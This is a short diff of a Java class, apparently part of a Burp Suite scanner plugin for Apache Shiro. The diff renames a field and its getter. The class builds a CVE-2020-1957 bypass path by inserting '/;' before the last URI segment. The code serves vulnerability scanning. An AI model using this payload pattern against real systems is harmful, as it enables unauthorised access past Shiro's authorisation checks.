@@ -1,7 +1,7 @@
 package burp.core.scanner.active.shiroscanner;
 
 public class CVE_2020_1957 {
-    public String requestURI;
+    public String exp;
 
     CVE_2020_1957(String requestURI){
         // CVE_2020_1957
@@ -9,15 +9,15 @@ public class CVE_2020_1957 {
             int i = requestURI.lastIndexOf("/");
             String before = requestURI.substring(0,i);
             String after = requestURI.substring(i);
-            this.requestURI = before + "/;" + after;
+            this.exp = before + "/;" + after;
         }else{
-            this.requestURI = "/xxxxxxxxxxxxxxxxxxxxxx";
+            this.exp = "/xxxxxxxxxxxxxxxxxxxxxx";
         }
     }
 
 
-    public String getRequestURI() {
-        return requestURI;
+    public String getExp() {
+        return exp;
     }
 
     @Override
